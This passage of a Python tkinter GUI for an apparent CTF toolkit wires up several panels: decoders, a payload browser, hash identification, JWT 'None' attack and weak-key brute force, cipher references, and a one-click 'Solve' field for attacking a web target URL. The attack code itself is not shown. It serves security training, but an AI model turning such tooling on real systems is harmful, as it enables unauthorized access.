        for w in self.detect_btns.winfo_children():

            w.destroy()

        self.detect_label.config(text="")



    def _detect(self):

        """检测编码类型并显示可点击解码按钮."""

        text = self._get_text()

        _clear_output(self.output)

        for w in self.detect_btns.winfo_children():

            w.destroy()

        if not text:

            self.detect_label.config(text="⚠ 请先粘贴密文")

            _append(self.output, "⚠ 请先粘贴密文到上方输入框")

            return



        # Run detection

        detections = detect_encoding(text)

        if not detections:

            self.detect_label.config(text="❌ 未识别到已知编码")

            _append(self.output, "❌ 自动检测未识别到已知编码类型\n\n💡 试试:\n  • 点「💣 暴力全部」尝试所有解码器\n  • 用「手动选择」下拉框指定编码")

            return



        # Show detection results

        lines = [f"✅ 检测到 {len(detections)} 种可能编码:"]

        for enc_id, desc, conf in detections[:8]:

            emoji = "🟢" if conf >= 80 else "🟡" if conf >= 50 else "🟠"

            lines.append(f"  {emoji} {desc} — 置信度 {conf}%")

        self.detect_label.config(text="\n".join(lines))



        # Show results + quick-decode buttons

        _append(self.output, f"📋 输入 ({len(text)} 字符):\n  {text[:200]}\n\n🔍 检测结果:\n")

        for enc_id, desc, conf in detections[:8]:

            _append(self.output, f"  {'🟢' if conf >= 80 else '🟡' if conf >= 50 else '🟠'} {desc} ({enc_id}) — {conf}%")



        # Create quick-decode buttons for top results

        for enc_id, desc, conf in detections[:5]:

            btn = tk.Button(self.detect_btns,

                           text=f"🔓 用 {desc.split()[0]} 解码",

                           command=lambda eid=enc_id, edesc=desc: self._quick_decode(eid, edesc),

                           bg=INPUT_BG, fg=GREEN, activebackground=GREEN,

                           activeforeground=DARK, relief="flat",

                           padx=10, pady=2, cursor="hand2",

                           font=("Microsoft YaHei UI", 9))

            btn.pack(side=tk.LEFT, padx=2, pady=2)



    def _quick_decode(self, enc_id, desc):

        """Quick decode with a specific encoding."""

        text = self._get_text()

        decoder_func, _ = DECODERS.get(enc_id, (None, None))

        if not decoder_func:

            _append(self.output, f"\n❌ 解码器 {desc} 不可用")

            return

        try:

            result = decoder_func(text)

            _append(self.output, f"\n{'─'*50}\n🔓 使用 {desc} 解码:\n{'─'*50}\n{result}")

        except Exception as e:

            _append(self.output, f"\n❌ {desc} 解码失败: {e}")



    def _manual_decode(self):

        """Manually decode with selected encoding."""

        text = self._get_text()

        if not text:

            _clear_output(self.output)

            _append(self.output, "⚠ 请先粘贴密文")

            return

        choice = self.manual_var.get().split("/")[0]

        decoders = {

            "base64": ("base64", decode_base64),

            "base32": ("base32", decode_base32),

            "base16": ("base16", decode_base16),

            "url": ("url", decode_url),

            "html": ("html", decode_html),

            "unicode": ("unicode", decode_unicode_escape),

            "binary": ("binary", decode_binary),

            "octal": ("octal", decode_octal),

            "decimal": ("decimal", decode_decimal),

            "rot13": ("rot13", decode_rot13),

            "morse": ("morse", decode_morse),

            "base58": ("base58", decode_base58),

            "base85": ("base85", decode_base85),
            "base91": ("base91", decode_base91),
            "base92": ("base92", decode_base92),
            "rot47": ("rot47", decode_rot47),
            "shellcode": ("shellcode", decode_shellcode),
            "brainfuck": ("brainfuck", decode_brainfuck),
            "ook": ("ook", decode_ook),
            "quoted_printable": ("quoted_printable", decode_quoted_printable),
            "uuencode": ("uuencode", decode_uuencode),
            "xxencode": ("xxencode", decode_xxencode),
            "utf7": ("utf7", decode_utf7),
            "punycode": ("punycode", decode_punycode),
            "buddha": ("udkta", _decode_buddha),
            "core_values": ("udkcv", core_values_decode),
            "beast": ("udkbs", beast_decode),
            "bear": ("udkbr", bear_decode),
            "surnames": ("udksn", surnames_decode),
            "telegraph": ("udktg", telegraph_decode),

        }

        if choice not in decoders:

            _append(self.output, f"❌ 不支持的编码: {choice}")

            return

        enc_id, func = decoders[choice]

        _clear_output(self.output)

        try:

            result = func(text)

            _append(self.output, f"📥 {text[:80]}...\n\n🔓 用 {enc_id} 解码:\n{'─'*50}\n{result}")

        except Exception as e:

            _append(self.output, f"❌ {enc_id} 解码失败: {e}")



    def _chain(self):

        """Chain decode: recursively decode until can't."""

        text = self._get_text()

        _clear_output(self.output)

        if not text:

            _append(self.output, "⚠ 请先粘贴密文")

            return

        _append(self.output, f"📋 输入 ({len(text)} 字符):\n  {text[:200]}\n\n🔗 链式解码:\n")

        try:

            steps = chain_decode(text)

            if not steps:

                _append(self.output, "❌ 未识别到可链式解码的编码")

                return

            for i, step in enumerate(steps):

                enc_id, enc_desc, decoded = step

                _append(self.output, f"  Step {i+1}: {enc_desc} ({enc_id})")

                _append(self.output, f"           → {decoded[:150]}\n")

            _append(self.output, f"\n{'═'*50}\n✅ 最终结果: {steps[-1][2]}\n{'═'*50}")

        except Exception as e:

            _append(self.output, f"❌ 链式解码失败: {e}\n\n💡 试试「🔍 识别编码」或「💣 暴力全部」")



    def _brute(self):

        """Brute force: try ALL decoders."""

        text = self._get_text()

        _clear_output(self.output)

        if not text:

            _append(self.output, "⚠ 请先粘贴密文")

            return

        _append(self.output, f"📋 输入 ({len(text)} 字符):\n  {text[:200]}\n\n💣 暴力尝试所有解码器:\n")

        try:

            results = brute_decode(text)

            if not results:

                _append(self.output, "\n❌ 所有解码器均未得到可读结果")

                return

            _append(self.output, f"\n找到 {len(results)} 个可读结果:\n{'─'*50}")

            for r in results:

                enc_id, enc_desc, decoded = r[0], r[1], r[2]

                confidence = r[3] if len(r) > 3 else 50

                marker = "⭐" if confidence >= 80 else "  "

                _append(self.output, f"\n{marker} {enc_desc} ({enc_id}): {decoded[:200]}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")





class PayloadPanel(tk.Frame):

    """通用 Payload 面板"""

    def __init__(self, parent, title, emoji, get_data_fn, search_fn=None, analyzer_fn=None):

        super().__init__(parent, bg=BG)

        self.get_data = get_data_fn

        self.search_fn = search_fn

        self.analyzer_fn = analyzer_fn



        _label(self, f"{emoji} {title}", fg=ACCENT, font_size=16, bold=True, pady=8)



        # 靶场分析条 (Upload 专用)

        if analyzer_fn:

            analyze_frame = tk.Frame(self, bg=DARK)

            analyze_frame.pack(fill=tk.X, padx=4, pady=(0,4))

            _label(analyze_frame, "🎯 分析:", fg=ACCENT, pady=0, font_size=11)

            self.analyze_entry = tk.Entry(analyze_frame, bg=INPUT_BG, fg=FG,

                insertbackground=ACCENT, relief="flat", borderwidth=0,

                font=("Cascadia Code", 11))

            self.analyze_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=6, ipady=4)

            self.analyze_entry.bind("<Return>", lambda e: self._do_analyze())

            tk.Button(analyze_frame, text="分析", command=self._do_analyze,

                bg=ACCENT, fg=DARK, relief="flat", padx=14, pady=4,

                cursor="hand2", font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(2,0))



        # 搜索

        search_frame = tk.Frame(self, bg=BG)

        search_frame.pack(fill=tk.X, pady=4)

        _label(search_frame, "🔍 搜索:", pady=0)

        self.search_entry = tk.Entry(search_frame, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                     relief="flat", borderwidth=0, font=("Cascadia Code", 11))

        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(8, 4), ipady=4)

        tk.Button(search_frame, text="搜索", command=self._search, bg=ACCENT, fg=DARK,

                  relief="flat", padx=12, pady=4, cursor="hand2",

                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT)



        # 分类选择 (搜索下方)

        top = tk.Frame(self, bg=BG)

        top.pack(fill=tk.X, pady=4)

        _label(top, "分类:", pady=0)

        self.category_var = tk.StringVar(value="-- 选择分类 --")

        self.category_combo = _combo(top, ["-- 选择分类 --"], textvariable=self.category_var)

        self.category_combo.bind("<<ComboboxSelected>>", lambda e: self._refresh())

        self.top_frame = top



        self.output_frame, self.output = _output_area(self, 22)

        self.output_frame.pack(fill=tk.BOTH, expand=True)

        _append(self.output, "👆 请在上方选择一个分类查看 Payload")



    def _refresh(self):

        _clear_output(self.output)

        cat = self.category_var.get()

        if not cat or cat == "-- 选择分类 --":

            _append(self.output, "👆 请在上方选择一个分类查看 Payload")

            return

        try:

            data = self.get_data(cat)

            self._display(data)

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _do_analyze(self):

        """运行靶场分析."""

        if not self.analyzer_fn:

            return

        blacklist = self.analyze_entry.get().strip()

        if not blacklist:

            _clear_output(self.output)

            _append(self.output, "👆 请在上方输入靶场黑名单 (如: php,php3,php5)")

            return

        _clear_output(self.output)

        try:

            result = self.analyzer_fn(blacklist)

            _append(self.output, result)

        except Exception as e:

            _append(self.output, f"❌ 分析出错: {e}")



    def _display(self, data):

        if isinstance(data, dict):

            for key, items in data.items():

                _append(self.output, f"\n▸ {key}\n")

                if isinstance(items, list):

                    for item in items:

                        if isinstance(item, str):

                            _append(self.output, f"  • {item}")

                        elif isinstance(item, dict):

                            _append(self.output, f"  • {item.get('name','?')}")

                            if 'payload' in item:

                                _append(self.output, f"    {item['payload'][:150]}")

                            if 'tip' in item:

                                _append(self.output, f"    💡 {item['tip'][:120]}")

                elif isinstance(items, dict):

                    for sub_key, sub_items in items.items():

                        if isinstance(sub_items, list):

                            _append(self.output, f"  ▸ {sub_key}:")

                            for item in sub_items:

                                _append(self.output, f"    • {str(item)[:200]}")

                        else:

                            _append(self.output, f"  ▸ {sub_key}: {sub_items}")

                else:

                    _append(self.output, f"  {items}")



    def _search(self):

        kw = self.search_entry.get().strip()

        if not kw or not self.search_fn:

            return

        _clear_output(self.output)

        results = self.search_fn(kw)

        if results:

            _append(self.output, f"🔍 '{kw}' 的搜索结果 ({len(results)} 条):\n")

            for r in results[:30]:

                cat = r.get("category", "")

                nm = r.get("name", "")

                payload = r.get("payload", r.get("content", ""))

                _append(self.output, f"\n  [{cat}] {nm}")

                if payload:

                    _append(self.output, f"  {str(payload)[:200]}")

        else:

            _append(self.output, f"未找到包含 '{kw}' 的结果")



    def set_categories(self, categories):

        self.category_combo["values"] = ["-- 选择分类 --"] + list(categories)

        self.category_combo.set("-- 选择分类 --")





class HashPanel(tk.Frame):

    """Hash 识别面板"""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔍 Hash 类型识别", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "支持 40+ 种 Hash 算法自动匹配", fg=YELLOW, font_size=9)



        _label(self, "📥 输入 Hash:", pady=8)

        self.hash_entry = _entry(self, 70)

        self.hash_entry.bind("<Return>", lambda e: self._identify())



        tk.Button(self, text="🔍 识别", command=self._identify, bg=ACCENT, fg=DARK,

                  relief="flat", padx=20, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 11, "bold")).pack(anchor="w", pady=4)



        _label(self, "📤 识别结果:", pady=8)

        self.output_frame, self.output = _output_area(self, 14)

        self.output_frame.pack(fill=tk.BOTH, expand=True)



    def _identify(self):

        _clear_output(self.output)

        h = self.hash_entry.get().strip()

        if not h:

            _append(self.output, "⚠ 请先输入 Hash 值")

            return

        try:

            result = hash_identify(h)

            _append(self.output, f"📋 输入: {h[:80]}")

            _append(self.output, f"📏 长度: {len(h)} 字符")

            _append(self.output, f"\n📊 可能的算法:")

            if isinstance(result, list):

                for r in result:

                    _append(self.output, f"  • {r}")

            elif isinstance(result, dict):

                for algo, confidence in result.items():

                    _append(self.output, f"  • {algo} (置信度: {confidence})")

            else:

                _append(self.output, f"  {result}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")





class JWTPanel(tk.Frame):

    """JWT 分析面板"""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔑 JWT 分析与攻击", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "解析 → 分析 → None 攻击 → 弱密钥爆破 → 伪造", fg=YELLOW, font_size=9)



        _label(self, "📥 JWT Token:", pady=8)

        self.jwt_entry = _entry(self, 70)



        btn_frame = tk.Frame(self, bg=BG)

        btn_frame.pack(anchor="w", pady=4)

        for label, cmd in [("📋 解析", self._decode), ("🔍 分析", self._analyze),

                           ("⚡ None攻击", self._none), ("💣 弱密钥爆破", self._brute)]:

            tk.Button(btn_frame, text=label, command=cmd, bg=INPUT_BG, fg=FG,

                      activebackground=ACCENT, relief="flat", padx=12, pady=5,

                      cursor="hand2", font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=2)



        _label(self, "📤 结果:", pady=8)

        self.output_frame, self.output = _output_area(self, 16)

        self.output_frame.pack(fill=tk.BOTH, expand=True)



    def _get_token(self):

        return self.jwt_entry.get().strip()



    def _decode(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t:

            _append(self.output, "⚠ 请输入 JWT")

            return

        try:

            header, payload = decode_jwt(t)

            _append(self.output, f"📋 Header:\n{_pretty_json(header)}\n")

            _append(self.output, f"📋 Payload:\n{_pretty_json(payload)}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _analyze(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t: return

        try:

            r = analyze_jwt(t)

            for k, v in r.items():

                _append(self.output, f"{k}: {v}\n")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _none(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t: return

        try:

            r = none_attack(t)

            _append(self.output, f"⚡ None 算法攻击:\n{r}")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")



    def _brute(self):

        _clear_output(self.output)

        t = self._get_token()

        if not t: return

        _append(self.output, "💣 弱密钥爆破中... (使用内置词库)\n")

        try:

            r = brute_jwt(t)

            if r:

                _append(self.output, f"✅ 密钥找到: {r}")

            else:

                _append(self.output, "❌ 内置词库未匹配")

        except Exception as e:

            _append(self.output, f"❌ 错误: {e}")





class MiscCryptoPanel(tk.Frame):

    """Misc Crypto – 20+ common cipher types with encode/decode + reference images."""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔐 Misc Crypto Knowledge Base", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "20+ CTF Misc 密码类型 — 编码/解码 + 参考图/说明文本", fg=YELLOW, font_size=9)



        # ── Top bar: category + search ──

        top = tk.Frame(self, bg=BG)

        top.pack(fill=tk.X, padx=4, pady=(8, 4))



        tk.Label(top, text="分类:", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(0, 4))

        cats = ["全部"] + get_categories()

        self.cat_var = tk.StringVar(value="全部")

        self.cat_cb = ttk.Combobox(top, textvariable=self.cat_var, values=cats,

                                    state="readonly", width=16)

        self.cat_cb.pack(side=tk.LEFT, padx=2)

        self.cat_cb.bind("<<ComboboxSelected>>", self._on_cat_change)



        tk.Label(top, text="搜索:", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 11)).pack(side=tk.LEFT, padx=(12, 4))

        self.search_var = tk.StringVar()

        self.search_entry = tk.Entry(top, textvariable=self.search_var,

                                      bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                      relief="flat", font=("Cascadia Code", 11),

                                      width=20)

        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        self.search_entry.bind("<KeyRelease>", self._on_search)



        # ── Main area: list + detail ──

        panes = tk.PanedWindow(self, bg=BG, sashwidth=3)

        panes.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)



        # Left: cipher list

        list_frame = tk.Frame(panes, bg=BG)

        panes.add(list_frame, width=260)

        _label(list_frame, "密码类型:", pady=4)

        self.cipher_list = tk.Listbox(list_frame, bg=INPUT_BG, fg=FG,

                                       selectbackground=ACCENT, selectforeground=DARK,

                                       relief="flat", borderwidth=0,

                                       font=("Microsoft YaHei UI", 10), height=18)

        self.cipher_list.pack(fill=tk.BOTH, expand=True, pady=(0, 4))

        self.cipher_list.bind("<<ListboxSelect>>", self._on_cipher_select)



        # Right: detail + io + reference

        right = tk.Frame(panes, bg=BG)

        panes.add(right, width=550)



        # Detail info

        self.info_var = tk.StringVar(value="")

        _label(right, "详情:", pady=4)

        self.info_label = tk.Label(right, textvariable=self.info_var, bg=BG, fg=FG,

                                    anchor="nw", justify="left",

                                    font=("Microsoft YaHei UI", 10),

                                    wraplength=520)

        self.info_label.pack(fill=tk.X, pady=(0, 4))



        # Reference area (image button + text content)

        ref_header = tk.Frame(right, bg=BG)

        ref_header.pack(fill=tk.X, pady=(2, 2))

        tk.Label(ref_header, text="参考内容:", bg=BG, fg=YELLOW,

                 font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT)

        self.view_img_btn = tk.Button(ref_header, text="🖼 查看原图",

                                       command=self._open_image,

                                       bg=INPUT_BG, fg=ACCENT,

                                       activebackground=ACCENT, activeforeground=DARK,

                                       relief="flat", padx=12, pady=3,

                                       cursor="hand2",

                                       font=("Microsoft YaHei UI", 9, "bold"))

        self.view_img2_btn = tk.Button(ref_header, text="🖼 图2",

                                        command=self._open_image2,

                                        bg=INPUT_BG, fg=YELLOW,

                                        activebackground=YELLOW, activeforeground=DARK,

                                        relief="flat", padx=10, pady=3,

                                        cursor="hand2",

                                        font=("Microsoft YaHei UI", 9, "bold"))

        self.img_path_var = tk.StringVar(value="")

        tk.Label(ref_header, textvariable=self.img_path_var, bg=BG, fg=DARK,

                 font=("Cascadia Code", 7)).pack(side=tk.RIGHT, padx=4)



        # Reference text content

        self.ref_frame, self.ref_text = _output_area(right, 10)

        self.ref_frame.pack(fill=tk.BOTH, expand=True, pady=(2, 4))



        # IO area

        io_bar = tk.Frame(right, bg=BG)

        io_bar.pack(fill=tk.X, pady=4)

        tk.Label(io_bar, text="输入:", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=(0, 4))

        self.io_entry = tk.Entry(io_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                  relief="flat", font=("Cascadia Code", 11))

        self.io_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        self.io_entry.bind("<Return>", lambda e: self._do_encode())

        tk.Button(io_bar, text="Encode", command=self._do_encode,

                  bg=ACCENT, fg=DARK, activebackground=GREEN, relief="flat",

                  padx=12, pady=3, cursor="hand2",

                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)

        tk.Button(io_bar, text="Decode", command=self._do_decode,

                  bg=INPUT_BG, fg=ACCENT, activebackground=BORDER, relief="flat",

                  padx=12, pady=3, cursor="hand2",

                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)



        # Key entry (for vigenere etc.)

        key_bar = tk.Frame(right, bg=BG)

        key_bar.pack(fill=tk.X, pady=(0, 4))

        tk.Label(key_bar, text="密钥:", bg=BG, fg=YELLOW,

                 font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(0, 4))

        self.key_entry = tk.Entry(key_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                                   relief="flat", font=("Cascadia Code", 11), width=20)

        self.key_entry.pack(side=tk.LEFT, padx=4, ipady=2)



        # Output

        _label(right, "输出:", pady=4)

        self.output_frame, self.output = _output_area(right, 6)

        self.output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 4))



        # Store state

        self._selected_cid = None

        self._current_image_path = ""



        # Load initial data

        self._ciphers = list_ciphers()

        self._refresh_list()



    def _refresh_list(self):

        """Rebuild the cipher listbox."""

        self.cipher_list.delete(0, tk.END)

        for c in self._ciphers:

            tag = "🔧" if c.get("encode") else "📖"

            self.cipher_list.insert(tk.END, tag + " " + c["name"])



    def _on_cat_change(self, event=None):

        cat = self.cat_var.get()

        if cat == "全部":

            self._ciphers = list_ciphers()

        else:

            self._ciphers = list_ciphers(cat)

        self._refresh_list()

        self._clear_detail()



    def _on_search(self, event=None):

        q = self.search_var.get().strip()

        if q:

            self._ciphers = search_ciphers(q)

        else:

            cat = self.cat_var.get()

            self._ciphers = list_ciphers() if cat == "全部" else list_ciphers(cat)

        self._refresh_list()



    def _on_cipher_select(self, event=None):

        sel = self.cipher_list.curselection()

        if not sel:

            return

        idx = sel[0]

        if idx >= len(self._ciphers):

            return

        info = self._ciphers[idx]

        cid = info.get("id", "")

        _clear_output(self.output)



        # Build info lines

        lines = [

            "名称: " + info["name"],

            "ID:   " + cid,

            "分类: " + info["category"],

            "别名: " + ", ".join(info.get("aliases", []) or ["无"]),

            "描述: " + info["description"],

        ]

        if info.get("features"):

            lines.append("特征: " + ", ".join(info["features"]))

        if info.get("encode"):

            lines.append("状态: 支持编码/解码")

        else:

            lines.append("状态: 仅提供参考图/说明")

        self.info_var.set("\n".join(lines))



        # Show reference: image button + text content

        img = get_image_path(cid)

        img2 = get_image2_path(cid)

        self._current_image_path = img if img else ""

        self._current_image2_path = img2 if img2 else ""



        if img:

            self.view_img_btn.configure(state="normal", bg=INPUT_BG, fg=ACCENT)

            self.img_path_var.set(os.path.basename(img))

            self.view_img_btn.pack(side=tk.LEFT, padx=(8, 0))

        else:

            self.view_img_btn.pack_forget()



        if img2:

            self.view_img2_btn.configure(state="normal")

            self.view_img2_btn.pack(side=tk.LEFT, padx=4)

        else:

            self.view_img2_btn.pack_forget()



        if not img and not img2:

            self.img_path_var.set("")



        # Load and show text content

        _clear_output(self.ref_text)

        txt_content = get_text_content(cid)

        if txt_content:

            _append(self.ref_text, txt_content)

        elif not img and not img2:

            # No image, no text — show algorithm note

            _append(self.ref_text, "[此密码为经典算法，无需参考图/说明文件]")

        else:

            tips = []

            if img:

                tips.append("查看原图")

            if img2:

                tips.append("图2")

            _append(self.ref_text, f"[点击 {', '.join(tips)} 按钮查看参考图片]")



        # Store selected cipher id

        self._selected_cid = cid



    def _clear_detail(self):

        self.info_var.set("")

        self.img_path_var.set("")

        self.view_img_btn.pack_forget()

        self.view_img2_btn.pack_forget()

        _clear_output(self.ref_text)

        self._selected_cid = None

        self._current_image_path = ""

        self._current_image2_path = ""



    def _open_image(self):

        """Open reference image with system viewer."""

        if self._current_image_path and os.path.exists(self._current_image_path):

            try:

                os.startfile(self._current_image_path)

            except Exception as e:

                _clear_output(self.ref_text)

                _append(self.ref_text, "无法打开图片: " + str(e))



    def _open_image2(self):

        """Open second reference image."""

        if self._current_image2_path and os.path.exists(self._current_image2_path):

            try:

                os.startfile(self._current_image2_path)

            except Exception as e:

                _clear_output(self.ref_text)

                _append(self.ref_text, "无法打开图片: " + str(e))



    def _do_encode(self):

        text = self.io_entry.get().strip()

        cid = self._selected_cid

        if not cid:

            _clear_output(self.output)

            _append(self.output, "⚠ 请先选择密码类型")

            return

        if not text:

            _clear_output(self.output)

            _append(self.output, "⚠ 请输入文本")

            return

        key = self.key_entry.get().strip()

        _clear_output(self.output)

        try:

            result = mc_encode(cid, text, key=key)

            _append(self.output, "🔒 " + cid + " 编码:\n" + result)

        except Exception as e:

            _append(self.output, "❌ 错误: " + str(e))



    def _do_decode(self):

        text = self.io_entry.get().strip()

        cid = self._selected_cid

        if not cid:

            _clear_output(self.output)

            _append(self.output, "⚠ 请先选择密码类型")

            return

        if not text:

            _clear_output(self.output)

            _append(self.output, "⚠ 请输入文本")

            return

        key = self.key_entry.get().strip()

        _clear_output(self.output)

        try:

            result = mc_decode(cid, text, key=key)

            _append(self.output, "🔓 " + cid + " 解码:\n" + result)

        except Exception as e:

            _append(self.output, "❌ 错误: " + str(e))





class ScriptsPanel(tk.Frame):

    """CTF scripts panel with dependency management."""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "CTF Scripts", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "D:\\CTF 41 scripts + dep management + Web Solver", fg=YELLOW, font_size=9)



        # Solve bar — input URL, one-click attack

        solve_bar = tk.Frame(self, bg=DARK)

        solve_bar.pack(fill=tk.X, padx=4, pady=(4, 0))

        tk.Label(solve_bar, text="Target:", bg=DARK, fg=ACCENT,

                 font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(8, 4))

        self.url_entry = tk.Entry(solve_bar, bg=INPUT_BG, fg=FG,

                                   insertbackground=ACCENT, relief="flat",

                                   font=("Cascadia Code", 10),

                                   width=50)

        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        self.url_entry.insert(0, "http://")

        self.solve_btn = tk.Button(solve_bar, text="Solve", command=self._solve_url,

                                    bg=ACCENT, fg=DARK, activebackground=GREEN,

                                    relief="flat", padx=16, pady=3, cursor="hand2",

                                    font=("Microsoft YaHei UI", 10, "bold"))

        self.solve_btn.pack(side=tk.LEFT, padx=(4, 8))



        # Search bar + dep buttons

        top_bar = tk.Frame(self, bg=BG)

        top_bar.pack(fill=tk.X, pady=(8, 4), padx=4)

        tk.Label(top_bar, text="Search", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 12)).pack(side=tk.LEFT)

        self.search_entry = tk.Entry(top_bar, bg=INPUT_BG, fg=FG,

                                      insertbackground=ACCENT, relief="flat",

                                      font=("Cascadia Code", 11), width=25)

        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=8, ipady=4)

        self.search_entry.bind("<KeyRelease>", self._do_search)

        tk.Button(top_bar, text="Check Deps", command=self._check_deps,

                  bg=INPUT_BG, fg=YELLOW, activebackground=ACCENT, relief="flat",

                  padx=10, pady=4, cursor="hand2",

                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=2)

        tk.Button(top_bar, text="Install All", command=self._install_all_deps,

                  bg=INPUT_BG, fg=GREEN, activebackground=ACCENT, relief="flat",

                  padx=10, pady=4, cursor="hand2",

                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=2)



        cat_frame = tk.Frame(self, bg=BG)

        cat_frame.pack(fill=tk.X, pady=4, padx=4)

        self.cat_buttons = {}

        for cat_key, cat_label in [("all", "All"), ("crypto", "Crypto"),

                                    ("web", "Web"), ("reverse", "Reverse"),

                                    ("misc", "Misc")]:

            btn = tk.Button(cat_frame, text=cat_label, relief="flat",

                           bg=INPUT_BG, fg=FG, activebackground=ACCENT,

                           activeforeground=DARK, padx=12, pady=4,

                           cursor="hand2", font=("Microsoft YaHei UI", 9),

                           command=lambda c=cat_key: self._filter_cat(c))

            btn.pack(side=tk.LEFT, padx=2)

            self.cat_buttons[cat_key] = btn

        self.dep_status_label = tk.Label(cat_frame, text="", bg=BG, fg=YELLOW,

                                          font=("Microsoft YaHei UI", 8))

        self.dep_status_label.pack(side=tk.RIGHT, padx=8)



        panes = tk.PanedWindow(self, bg=BG, sashwidth=3)

        panes.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)



        list_frame = tk.Frame(panes, bg=BG)

        panes.add(list_frame, width=340)

        _label(list_frame, "Scripts:", pady=4)

        self.script_list = tk.Listbox(list_frame, bg=INPUT_BG, fg=FG,

                                       selectbackground=ACCENT,

                                       selectforeground=DARK,

                                       relief="flat", borderwidth=0,

                                       font=("Microsoft YaHei UI", 10),

                                       height=20)

        self.script_list.pack(fill=tk.BOTH, expand=True, pady=(0, 4))

        self.script_list.bind("<<ListboxSelect>>", self._on_select)



        detail_frame = tk.Frame(panes, bg=BG)

        panes.add(detail_frame, width=580)

        _label(detail_frame, "Details:", pady=4)

        self.detail_frame, self.detail_output = _output_area(detail_frame, 18)

        self.detail_frame.pack(fill=tk.BOTH, expand=True)



        btn_bar = tk.Frame(detail_frame, bg=BG)

        btn_bar.pack(fill=tk.X, pady=4)

        tk.Button(btn_bar, text="Run", command=self._run_selected,

                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",

                  padx=20, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 11, "bold")).pack(side=tk.LEFT, padx=(0, 8))

        self.install_btn = tk.Button(btn_bar, text="Install Script Deps",

                                      command=self._install_script_deps,

                                      bg=INPUT_BG, fg=YELLOW, activebackground=ACCENT,

                                      relief="flat", padx=12, pady=6, cursor="hand2",

                                      font=("Microsoft YaHei UI", 10))

        self.install_btn.pack(side=tk.LEFT, padx=(0, 8))

        self.install_btn.pack_forget()

        tk.Button(btn_bar, text="Clear", command=lambda: _clear_output(self.detail_output),

                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)



        self._all_scripts = []

        self._current_key = None

        self._dep_status = {}

        self._populate_list()



    def _populate_list(self, category=None, query=None):

        self.script_list.delete(0, tk.END)

        self._all_scripts = []

        try:

            from .scripts.registry import SCRIPTS, CATEGORIES

            from .scripts.deps import check_dep

            for key, meta in sorted(SCRIPTS.items(), key=lambda x: x[0]):

                if category and category != "all" and meta["category"] != category:

                    continue

                if query and query.lower() not in key.lower() and query.lower() not in meta["title"].lower() and query.lower() not in meta["description"].lower():

                    continue

                cat_icon = CATEGORIES.get(meta["category"], "?")

                if meta["deps"]:

                    all_ok = all(check_dep(d) for d in meta["deps"])

                    dep_icon = " [OK]" if all_ok else " [MISS]"

                else:

                    dep_icon = ""

                display = cat_icon + " " + meta['title'] + dep_icon

                self.script_list.insert(tk.END, display)

                self._all_scripts.append((key, meta))

        except Exception as e:

            self.script_list.insert(tk.END, "err: " + str(e))



    def _filter_cat(self, cat):

        for k, btn in self.cat_buttons.items():

            if k == cat:

                btn.configure(bg=ACCENT, fg=DARK)

            else:

                btn.configure(bg=INPUT_BG, fg=FG)

        self._populate_list(category=cat)



    def _do_search(self, event):

        q = self.search_entry.get().strip()

        self._populate_list(query=q if q else None)



    def _on_select(self, event):

        sel = self.script_list.curselection()

        if not sel:

            return

        idx = sel[0]

        if idx >= len(self._all_scripts):

            return

        key, meta = self._all_scripts[idx]

        self._current_key = key

        _clear_output(self.detail_output)

        _append(self.detail_output, "title: " + meta['title'] + "\n")

        _append(self.detail_output, "=" * 50 + "\n")

        _append(self.detail_output, "category: " + meta['category'] + "\n")

